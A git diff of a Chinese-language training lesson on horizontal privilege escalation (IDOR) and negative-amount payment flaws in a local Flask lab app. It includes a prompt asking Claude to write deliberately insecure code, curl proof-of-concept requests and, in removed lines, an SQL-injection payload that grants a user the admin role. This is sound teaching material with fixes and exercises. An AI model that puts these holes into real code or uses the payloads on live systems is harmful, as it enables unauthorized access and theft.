@@ -1,289 +1,253 @@
 # Day 5 - 越权与支付逻辑漏洞
 
-## 一、页面部署提示词
+---
 
-> 学生将此提示词发给 Claude，即可生成带越权漏洞的功能：
+## 一、发给 Claude 的提示词
+
+把以下内容完整复制粘贴到 claude.ai 对话框中：
 
 ```
-在 Flask 中实现个人中心和充值功能，要求：
-1. 用户访问 /profile?user_id=X 查看个人资料
-2. 用户可以通过表单修改自己的邮箱和手机号
-3. 实现充值功能：/recharge 传入 user_id 和 amount
-4. 为了方便测试，user_id 通过 URL 参数传递
-5. 充值时直接更新数据库余额，不做额外校验
-6. 不需要验证当前登录用户和操作对象是否匹配
+请在上次已有的登录、注册、搜索、头像上传功能基础上，继续增加个人中心和充值功能。保持原有功能不变。
+
+### 在 app.py 中新增以下路由：
+
+1. 新增路由 /profile，支持 GET：
+   - 从 URL 参数获取 user_id（如 /profile?user_id=1）
+   - 根据 user_id 从用户数据中查询资料（邮箱、手机、余额）
+   - 将查询结果显示在个人中心页面
+   - 不要验证当前登录用户和要查询的 user_id 是否匹配
+   - 管理员和普通用户的资料都可以通过修改 URL 参数来查看
+
+2. 新增路由 /recharge，支持 POST：
+   - 从表单接收 user_id 和 amount 参数
+   - 直接修改用户数据中的余额字段：balance = balance + amount
+   - 不要检查 amount 是否为负数
+   - 充值成功后重定向到 /profile?user_id={user_id}
+
+### 新增 templates/profile.html
+
+个人中心页面，继承 base.html，包含：
+- 显示用户信息：ID、用户名、邮箱、手机、余额
+- 充值表单：金额输入框、充值按钮（提交到 /recharge）
+- 使用隐藏字段传递 user_id
+
+### 修改 templates/base.html
+
+- 在导航栏登录后的菜单中添加"个人中心"链接
+
+### 修改 templates/index.html
+
+- 在已登录状态下的欢迎页面中添加"个人中心"的快捷入口
+
+### 代码规范要求
+- user_id 必须从 URL 参数或表单参数获取，不能从 session 获取
+- 不要验证当前用户是否有权查看其他用户的资料
+- amount 参数不要做正负校验
+- 不要添加任何权限检查
+
+生成全部代码后告诉我，我复制覆盖到本地项目中。
 ```
 
 ---
 
-## 二、漏洞关键代码解释
+## 二、学生操作步骤
+
+| 步骤 | 操作 | 说明 |
+|------|------|------|
+| 1 | 复制上面提示词发给 Claude | 在上次功能基础上增加个人中心和充值 |
+| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有功能不变 |
+| 3 | 终端运行 `python app.py` | 启动项目 |
+| 4 | 用普通用户登录，测试越权访问 | 见下方 POC |
+| 5 | 分析代码，编写修复到 fix/user_service_fix.py | 修复漏洞 |
+| 6 | `git add -A && git commit -m "day-05: 个人中心充值 + 越权支付修复"` | 提交成果 |
+
+---
+
+## 三、漏洞原理
 
 ### 漏洞 1：水平越权（IDOR）
 
 ```python
-# core/user_service.py
-def get_user_profile(user_id):
-    conn = _get_connection()
-    cursor = conn.cursor()
-    # ↓↓↓ 漏洞行：user_id 来自客户端，未验证归属
-    cursor.execute(f"SELECT id, username, email, phone, role, balance FROM users WHERE id = {user_id}")
-    row = cursor.fetchone()
-    conn.close()
-    return dict(row) if row else None
+# 提示词明确要求：user_id 从 URL 参数获取，不要验证是否匹配当前用户
+user_id = request.args.get('user_id', '1')
+# 直接查询该 user_id 的数据，不检查是否当前登录用户
 ```
 
-**问题**：
-- `user_id` 来自 URL 参数（客户端可控）
-- 未验证该 ID 是否属于当前登录用户
-- 普通用户可访问管理员信息（`user_id=1`）
+**危害**：普通用户 alice 登录后，修改 URL 中的 `user_id=1` 即可查看管理员 admin 的详细资料（邮箱、手机、余额等）。
 
-**攻击方式**：
-```
-GET /profile?user_id=1    # admin 的信息
-GET /profile?user_id=2    # alice 的信息
-GET /profile?user_id=3    # bob 的信息
-```
-
-### 漏洞 2：垂直越权
+### 漏洞 2：支付逻辑漏洞 - 负金额
 
 ```python
-def update_user_profile(user_id, email, phone):
-    conn = _get_connection()
-    cursor = conn.cursor()
-    # ↓↓↓ 未校验当前用户角色，普通用户可修改管理员资料
-    cursor.execute(f"UPDATE users SET email = '{email}', phone = '{phone}' WHERE id = {user_id}")
+# 提示词明确要求：不要检查 amount 是否为负数
+amount = float(request.form.get('amount', '0'))
+balance = balance + amount  # amount = -10000 时，余额反而减少
 ```
 
-**问题**：未校验当前用户的 `role` 是否为 `admin`，普通用户只要知道 admin 的 `user_id=1` 即可修改管理员资料。
+**危害**：攻击者可以输入负金额"充值"，导致他人余额减少，或利用此漏洞进行不正当交易。
 
-### 漏洞 3：支付逻辑漏洞
+### 漏洞 3：SQL 注入（充值功能）
 
-```python
-def process_recharge(user_id, amount):
-    conn = _get_connection()
-    cursor = conn.cursor()
-    # ↓↓↓ 漏洞行：amount 未校验正负
-    cursor.execute(f"UPDATE users SET balance = balance + {amount} WHERE id = {user_id}")
-```
-
-**问题**：
-- `amount` 可以是负数，攻击者可输入 `-10000` 来减少他人余额
-- 无幂等校验，同一请求可重复发送
-- `amount` 是字符串拼接，还存在 SQL 注入风险
-
----
-
-## 三、漏洞成因总结
-
-| 漏洞 | 根本原因 | 攻击示例 |
-|------|---------|---------|
-| 水平越权 | 未验证资源所有权 | alice 查看 admin 资料 |
-| 垂直越权 | 未验证用户角色 | 普通用户修改管理员资料 |
-| 支付漏洞 | 未校验金额正负 | 充值 -10000 元 |
-| 参数篡改 | 关键参数由客户端传入 | 修改 user_id、amount |
+提示词要求使用字符串拼接 SQL，充值功能同样存在 SQL 注入风险。
 
 ---
 
 ## 四、POC 代码
 
-### POC 1：水平越权——查看他人信息
+### POC 1：水平越权
 
 ```bash
 # 以普通用户 alice 登录
-curl http://127.0.0.1:5000/login \
-  -d "username=alice&password=alice2025" \
-  -c /tmp/cookies_alice.txt
+curl http://127.0.0.1:5000/login -d "username=alice&password=alice2025" -c /tmp/cookies.txt
 
-# 越权查看管理员信息
-curl "http://127.0.0.1:5000/profile?user_id=1" \
-  -b /tmp/cookies_alice.txt | grep "admin\|99999"
+# 查看自己的资料（user_id=2）
+curl "http://127.0.0.1:5000/profile?user_id=2" -b /tmp/cookies.txt
+
+# 越权查看 admin 资料（user_id=1）
+curl "http://127.0.0.1:5000/profile?user_id=1" -b /tmp/cookies.txt
 ```
 
-**预期结果**：alice 可以看到 admin 的用户名、邮箱、余额等信息。
+**预期结果**：alice 可以查看 admin 的所有信息。
 
 ### POC 2：遍历所有用户
 
 ```bash
-# 用 alice 的 cookie 遍历用户
+# 用 alice 的身份遍历用户
 for i in 1 2 3 4 5; do
   echo "=== user_id=$i ==="
-  curl "http://127.0.0.1:5000/profile?user_id=$i" \
-    -b /tmp/cookies_alice.txt | grep -oP '(?<=用户名</strong>)[^<]+'
+  curl "http://127.0.0.1:5000/profile?user_id=$i" -b /tmp/cookies.txt | grep -E "ID|用户名|邮箱|手机|余额"
 done
 ```
 
-**预期结果**：alice 可以查看系统中任意用户的信息。
-
-### POC 3：支付负金额
+### POC 3：负金额充值
 
 ```bash
-# 使用 alice 给 admin 充值负金额（扣钱）
-curl http://127.0.0.1:5000/recharge \
-  -b /tmp/cookies_alice.txt \
-  -d "user_id=1&amount=-10000"
+# alice 给 admin 充值负金额（扣钱）
+curl http://127.0.0.1:5000/recharge -b /tmp/cookies.txt -d "user_id=1&amount=-5000"
 
 # 验证 admin 余额减少
-curl "http://127.0.0.1:5000/profile?user_id=1" \
-  -b /tmp/cookies_alice.txt | grep "余额"
+curl "http://127.0.0.1:5000/profile?user_id=1" -b /tmp/cookies.txt
 ```
 
-**预期结果**：admin 的余额从 99999 减少到 89999（被扣了 10000）。
+**预期结果**：admin 的余额减少（变负数），说明负金额没有被拦截。
 
 ---
 
-## 五、POC 代码测试方法（Burp Suite）
+## 五、Burp Suite 测试方法
 
-### 测试水平越权
+### 测试越权
 
-1. **登录 alice 账号**（`alice / alice2025`）
-2. 访问个人中心，Burp 拦截到请求：
-   ```
-   GET /profile?user_id=2 HTTP/1.1
-   Cookie: session=...
-   ```
-3. 发送到 Repeater
+1. 以 alice 登录
+2. 访问 `/profile?user_id=2` 查看自己的资料
+3. 将请求发送到 Repeater
 4. 修改 `user_id=2` 为 `user_id=1`
-5. 发送——看到 admin 的资料
+5. 发送请求，观察响应中显示的是 admin 的资料
 
 ### 测试支付漏洞
 
-1. **拦截充值请求**
-   ```
-   POST /recharge HTTP/1.1
-   user_id=2&amount=100
-   ```
+1. 拦截 POST /recharge 请求
 2. 修改 `amount=100` 为 `amount=-10000`
-3. 发送请求
-4. 返回个人中心查看余额变化
-
-### 自动化越权检测
-
-```bash
-# 批量测试越权
-for uid in 1 2 3 4 5 6 7 8 9 10; do
-  STATUS=$(curl -o /dev/null -s -w "%{http_code}" \
-    "http://127.0.0.1:5000/profile?user_id=$uid" \
-    -b /tmp/cookies_alice.txt)
-  echo "user_id=$uid → HTTP $STATUS"
-done
-```
+3. 放行请求
+4. 访问 `/profile?user_id=1` 查看余额是否减少
 
 ---
 
 ## 六、POC 代码详细解释
 
-### POC 1 详解
+### POC 1 详解：IDOR
 
-```bash
-curl "http://127.0.0.1:5000/profile?user_id=1"
+```
+攻击流程：
+
+1. alice 登录（获得 Cookie）
+   POST /login → username=alice&password=alice2025
+   ← Set-Cookie: session=xxx
+
+2. alice 查看自己的资料（正常）
+   GET /profile?user_id=2
+   ← 显示 alice 的信息
+
+3. alice 修改 URL 参数（越权）
+   GET /profile?user_id=1     ← 把 2 改成 1
+   ← 显示 admin 的信息        ← 不应该允许！
+
+为什么后端没拦截？
+   app.py 中：
+     user_id = request.args.get('user_id', '1')
+     # 没有检查 session['username'] 对应的 user_id 是否等于请求的 user_id
+     # 没有检查当前用户角色是否为 admin
+     # 直接查询并返回数据
 ```
 
-**攻击链分析**：
+### POC 3 详解：负金额
+
 ```
-正常访问（user_id=2，alice自己的资料）：
-  /profile?user_id=2
-  → 数据库查询 WHERE id=2
-  → 返回 alice 的信息  ← 正常
+正常充值：
+  POST /recharge → user_id=1&amount=100
+  SQL: UPDATE users SET balance = balance + 100 WHERE id = 1
+  结果: admin 余额增加了 100 元
 
-越权访问（user_id=1，admin的资料）：
-  /profile?user_id=1
-  → 数据库查询 WHERE id=1
-  → 返回 admin 的信息  ← 越权！alice 不应该看到 admin 的信息
-```
+恶意充值：
+  POST /recharge → user_id=1&amount=-5000
+  SQL: UPDATE users SET balance = balance + (-5000) WHERE id = 1
+  结果: admin 余额减少了 5000 元
 
-**为什么后端没拦住？**
-```
-用户请求 → 检查登录态 → 通过（已登录）
-        → 取 URL 参数 user_id → 直接查数据库
-        → 返回结果
-        → ❌ 没有检查：当前登录用户 (alice) 是否等于 user_id (admin)
-```
-
-正确的逻辑应该是：
-```
-用户请求 → 检查登录态
-        → 如果 user_id 不是当前用户 → 拒绝！
-        → 查数据库 → 返回
-```
-
-### POC 3 详解
-
-```bash
-curl ... -d "user_id=1&amount=-10000"
-```
-
-**攻击链分析**：
-
-1. 开发者预期 `amount` 总是正数（充值是加钱）
-2. 但实际 SQL 执行：`UPDATE users SET balance = balance + (-10000) WHERE id = 1`
-3. 结果：admin 的余额减少了 10000 元
-
-**更严重的攻击变种**：
-```
-# 给自己充负值（余额可能变负数，造成系统混乱）
-amount=-999999
-
-# 利用浮点数精度
-amount=0.01-0.001
-
-# SQL 注入 + 支付组合
-amount=-10000; UPDATE users SET role='admin' WHERE id=2 --
+问题：amount 没有校验正负，-5000 被直接用于 SQL 计算
 ```
 
 ---
 
 ## 七、修复方案
 
+创建 `fix/user_service_fix.py`：
+
 ```python
-# fix/user_service_fix.py
+from flask import session
 
-def get_user_profile_fixed(user_id, current_user_id, current_user_role):
-    """修复：验证资源所有权"""
-    # 修复 1：检查权限——只有管理员或本人可查看
-    if user_id != current_user_id and current_user_role != 'admin':
+def get_profile_fixed(user_id):
+    """修复：验证当前用户只能查看自己的资料"""
+    current_user = session.get('username')
+    # 修复：校验 user_id 是否匹配当前用户
+    # 可以通过查询数据库获取当前用户的 user_id
+    if not is_owner(current_user, user_id):
         return None  # 拒绝访问
+    # ... 正常查询逻辑
 
-    conn = _get_connection()
-    cursor = conn.cursor()
-    cursor.execute("SELECT ... FROM users WHERE id = ?", (user_id,))
-    ...
-
-def process_recharge_fixed(user_id, amount, current_user_id):
-    """修复：验证金额和身份"""
+def recharge_fixed(user_id, amount):
+    """修复：校验金额正负和身份"""
     # 修复 1：只能给自己充值
-    if user_id != current_user_id:
+    if not is_owner(session.get('username'), user_id):
         return {"success": False, "message": "不能为他人充值"}
 
     # 修复 2：金额必须为正数
-    try:
-        amount = float(amount)
-    except ValueError:
-        return {"success": False, "message": "金额格式错误"}
-
     if amount <= 0:
         return {"success": False, "message": "金额必须为正数"}
 
     # 修复 3：金额上限
-    if amount > 100000:
-        return {"success": False, "message": "单次充值不能超过10万元"}
+    if amount > 10000:
+        return {"success": False, "message": "单次充值不能超过10000元"}
 
     # 修复 4：使用参数化查询
-    conn = _get_connection()
-    cursor = conn.cursor()
-    cursor.execute("UPDATE users SET balance = balance + ? WHERE id = ?",
-                   (amount, user_id))
-    ...
+    # cursor.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (amount, user_id))
 ```
 
 ---
 
-## 八、课后作业
+## 八、漏洞复现检查清单
 
-1. 在 `fix/` 目录创建 `user_service_fix.py`，实现权限校验修复
-2. 修改 `app.py`，将当前登录用户的 `user_id` 和 `role` 传入修复函数
-3. 验证：
-   - alice 能否查看 admin 的资料？→ 应该被拒绝
-   - alice 能否给 admin 充值？→ 应该被拒绝
-   - 负金额充值是否被拦截？→ 应该被拒绝
-4. （进阶）设计一个完整的权限校验中间件函数
-5. 思考：即使修复了越权，代码中是否还存在 SQL 注入问题？
+| # | 检查项 | 命令 | 预期结果 |
+|---|--------|------|---------|
+| 1 | 水平越权 | alice 查看 `/profile?user_id=1` | 能看到 admin 的资料 |
+| 2 | 遍历用户 | for 循环 user_id 1~5 | 都能访问（不存在的返回空） |
+| 3 | 负金额充值 | `amount=-5000` | 余额减少 |
+| 4 | 越权充值 | alice 给 admin 充值 | 提示成功（不应允许） |
+
+---
+
+## 九、课后任务
+
+1. 用 alice 登录后尝试越权查看 admin 的资料
+2. 尝试给 admin 充值负金额
+3. 在 fix/ 目录下编写修复代码，添加权限校验和金额校验
+4. 验证修复后越权访问被拒绝、负金额被拦截
+5. 思考：即使修复了越权，充值功能是否还有 SQL 注入风险？
+6. 提交到自己的个人分支
